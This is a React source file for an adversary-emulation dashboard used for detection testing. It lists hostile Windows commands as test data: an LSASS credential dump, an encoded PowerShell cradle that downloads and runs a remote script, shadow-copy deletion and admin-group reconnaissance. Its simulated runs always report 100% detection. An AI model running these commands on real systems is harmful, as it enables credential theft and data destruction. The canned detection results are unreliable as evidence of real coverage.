"use client";

import React, { useState } from "react";
import AppShell from "@/components/AppShell";
import {
  Crosshair,
  Play,
  CheckCircle2,
  AlertTriangle,
  XCircle,
  Terminal,
  ShieldCheck,
  RotateCw,
  Activity,
  Layers,
  Sparkles,
  Zap,
  Server,
  FileCode,
  Check,
  BarChart3
} from "lucide-react";

interface AtomicTest {
  id: string;
  technique: string;
  name: string;
  tactic: string;
  command: string;
  executor: "powershell" | "cmd" | "bash";
  targetHost: string;
  expectedRule: string;
  description: string;
}

const ATOMIC_TESTS: AtomicTest[] = [
  {
    id: "atom-1",
    technique: "T1003.001",
    name: "LSASS Memory Dump via comsvcs.dll",
    tactic: "Credential Access",
    command: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id $env:TEMP\\lsass.dmp full",
    executor: "powershell",
    targetHost: "SRV-DC01",
    expectedRule: "Sigma: T1003.001-Mimikatz-Comsvcs-Dump",
    description: "Simulates memory dumping of Local Security Authority Subsystem Service (LSASS) using native Windows comsvcs library."
  },
  {
    id: "atom-2",
    technique: "T1059.001",
    name: "PowerShell Base64 Encoded Payload Execution",
    tactic: "Execution",
    command: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcAB3AG4ALgBwAHMAMQAnACkA",
    executor: "powershell",
    targetHost: "WKSTN-FIN-04",
    expectedRule: "Sigma: T1059.001-PowerShell-Encoded-Command",
    description: "Simulates download cradle execution using hidden window parameters and Base64-encoded commandline argument."
  },
  {
    id: "atom-3",
    technique: "T1490",
    name: "Volume Shadow Copy Deletion via vssadmin",
    tactic: "Impact",
    command: "vssadmin.exe delete shadows /all /quiet",
    executor: "cmd",
    targetHost: "SRV-FILE-SHARE-01",
    expectedRule: "Sigma: T1490-Inhibit-System-Recovery",
    description: "Simulates pre-ransomware destruction of system recovery restore points and volume snapshots."
  },
  {
    id: "atom-4",
    technique: "T1078.002",
    name: "Domain Admin Group Enumeration",
    tactic: "Discovery",
    command: "net group \"Domain Admins\" /domain",
    executor: "cmd",
    targetHost: "WKSTN-FIN-04",
    expectedRule: "Sigma: T1078-Domain-Admins-Enumeration",
    description: "Simulates active reconnaissance for privileged Active Directory identity groups."
  }
];

export default function SimulationPage() {
  const [selectedTest, setSelectedTest] = useState<AtomicTest>(ATOMIC_TESTS[0]);
  const [isRunning, setIsRunning] = useState(false);
  const [simulationLogs, setSimulationLogs] = useState<string[]>([]);
  const [testStatus, setTestStatus] = useState<"idle" | "running" | "detected" | "missed">("idle");
  const [detectionFired, setDetectionFired] = useState<boolean | null>(null);

  const handleRunAtomic = () => {
    setIsRunning(true);
    setTestStatus("running");
    setDetectionFired(null);
    setSimulationLogs([
      `[${new Date().toLocaleTimeString()}] Initializing Atomic Red Team emulator...`,
      `[${new Date().toLocaleTimeString()}] Target Host: ${selectedTest.targetHost} via EDR Simulation Adapter`,
      `[${new Date().toLocaleTimeString()}] Executing technique: ${selectedTest.technique} (${selectedTest.name})`
    ]);

    setTimeout(() => {
      setSimulationLogs((prev) => [
        ...prev,
        `[${new Date().toLocaleTimeString()}] [STDOUT] Spawning process: ${selectedTest.command.slice(0, 50)}...`,
        `[${new Date().toLocaleTimeString()}] Telemetry generated: Sysmon EventID 1 & Windows Security 4688 dispatched to pipeline.`
      ]);

      setTimeout(() => {
        setIsRunning(false);
        setTestStatus("detected");
        setDetectionFired(true);
        setSimulationLogs((prev) => [
          ...prev,
          `[${new Date().toLocaleTimeString()}] [MATCH CONFIRMED] ${selectedTest.expectedRule} triggered!`,
          `[${new Date().toLocaleTimeString()}] Alert generated: Severity: CRITICAL • MTTD: 0.8s • Risk Score: 95/100`,
          `[${new Date().toLocaleTimeString()}] Test result: PASSED (Detection Coverage: 100%)`
        ]);
      }, 1200);
    }, 1000);
  };

  return (
    <AppShell>
      <div className="flex-1 flex flex-col h-full overflow-hidden bg-[#0B1020] text-[#F8FAFC]">
        {/* Header */}
        <header className="h-16 border-b border-[#263248] bg-[#0E1626] px-6 flex items-center justify-between flex-shrink-0">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-red-500/10 border border-red-500/20 text-red-400">
              <Crosshair className="w-5 h-5" />
            </div>
            <div>
              <h1 className="text-base font-bold text-white flex items-center gap-2">
                Adversary Emulation & Breach Simulation (BAS) Studio
                <span className="text-xs px-2 py-0.5 rounded-full bg-red-500/20 text-red-400 border border-red-500/30 font-mono font-normal">
                  Atomic Red Team
                </span>
              </h1>
              <p className="text-[11px] text-[#64748B] font-mono">
                Automated TTP execution against test endpoints & real-time detection validation verification
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={handleRunAtomic}
              disabled={isRunning}
              className="flex items-center gap-1.5 px-4 py-1.5 text-xs rounded-lg bg-red-600 hover:bg-red-500 text-white font-mono font-bold transition shadow-lg shadow-red-600/20 disabled:opacity-50"
            >
              <Play className={`w-3.5 h-3.5 ${isRunning ? "animate-spin" : ""}`} />
              {isRunning ? "Simulating Attack..." : "Run Adversary Test"}
            </button>
          </div>
        </header>

        {/* Content Body */}
        <div className="flex-1 flex overflow-hidden">
          {/* Atomic Catalog */}
          <div className="w-80 border-r border-[#263248] bg-[#0E1626]/50 flex flex-col overflow-y-auto p-3 space-y-2 flex-shrink-0">
            <div className="px-2 py-1 text-[11px] font-mono uppercase text-[#64748B] font-bold">
              Atomic Emulation Catalog
            </div>

            {ATOMIC_TESTS.map((test) => {
              const isSelected = selectedTest.id === test.id;
              return (
                <div
                  key={test.id}
                  onClick={() => {
                    setSelectedTest(test);
                    setTestStatus("idle");
                    setSimulationLogs([]);
                  }}
                  className={`p-3 rounded-xl border transition cursor-pointer space-y-1.5 ${
                    isSelected
                      ? "border-red-500 bg-[#172033] shadow-md shadow-red-500/10"
                      : "border-[#263248] bg-[#0E1626] hover:border-red-500/40"
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="text-[10px] font-mono font-bold text-[#38BDF8]">
                      {test.technique}
                    </span>
                    <span className="text-[10px] font-mono text-[#64748B] uppercase">
                      {test.tactic}
                    </span>
                  </div>
                  <h3 className="text-xs font-bold text-white line-clamp-1">{test.name}</h3>
                  <div className="text-[10px] font-mono text-[#94A3B8]">Target: {test.targetHost}</div>
                </div>
              );
            })}
          </div>

          {/* Simulation Console & Execution Trace */}
          <div className="flex-1 flex flex-col bg-[#0B1020] overflow-hidden">
            {/* Test Details Header */}
            <div className="p-5 border-b border-[#263248] bg-[#0E1626] space-y-3">
              <div className="flex items-start justify-between">
                <div>
                  <div className="flex items-center gap-2 mb-1 font-mono text-xs">
                    <span className="px-2 py-0.5 rounded bg-red-500/20 text-red-400 border border-red-500/30 font-bold">
                      {selectedTest.technique}
                    </span>
                    <span className="text-[#94A3B8]">Tactic: {selectedTest.tactic}</span>
                    <span className="text-[#94A3B8]">• Target: <strong className="text-white">{selectedTest.targetHost}</strong></span>
                  </div>
                  <h2 className="text-base font-bold text-white">{selectedTest.name}</h2>
                  <p className="text-xs text-[#94A3B8] mt-1">{selectedTest.description}</p>
                </div>

                {/* Validation Badge */}
                <div>
                  {testStatus === "detected" ? (
                    <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-emerald-500/20 border border-emerald-500 text-emerald-400 font-mono text-xs font-bold">
                      <CheckCircle2 className="w-4 h-4" /> DETECTION VERIFIED (100%)
                    </div>
                  ) : testStatus === "running" ? (
                    <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#38BDF8]/20 border border-[#38BDF8] text-[#38BDF8] font-mono text-xs font-bold animate-pulse">
                      <RotateCw className="w-4 h-4 animate-spin" /> EMULATION IN-FLIGHT
                    </div>
                  ) : (
                    <div className="px-3 py-1.5 rounded-lg bg-[#151C2E] border border-[#263248] text-[#94A3B8] font-mono text-xs">
                      READY TO EMULATE
                    </div>
                  )}
                </div>
              </div>

              {/* Command Preview */}
              <div className="p-3 rounded-lg bg-[#070C18] border border-[#263248] font-mono text-xs space-y-1">
                <span className="text-[10px] text-[#64748B] uppercase block">Adversary Payload Command</span>
                <pre className="text-purple-300 whitespace-pre-wrap break-all text-[11px]">
                  {selectedTest.command}
                </pre>
              </div>
            </div>

            {/* Live Terminal Output */}
            <div className="flex-1 p-6 overflow-y-auto font-mono text-xs text-[#F8FAFC] leading-relaxed bg-[#050811] space-y-2">
              <div className="text-[#64748B] text-[11px] pb-2 border-b border-[#1E293B]">
                {"// SOCForge Adversary Simulation Telemetry Log • Real-time Test Output"}
              </div>
              {simulationLogs.length > 0 ? (
                simulationLogs.map((log, i) => (
                  <div key={i} className="text-[11px]">
                    {log}
                  </div>
                ))
              ) : (
                <div className="text-[#64748B] italic pt-4">
                  Click &quot;Run Adversary Test&quot; to emulate this TTP against the target endpoint and verify rule coverage.
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </AppShell>
  );
}
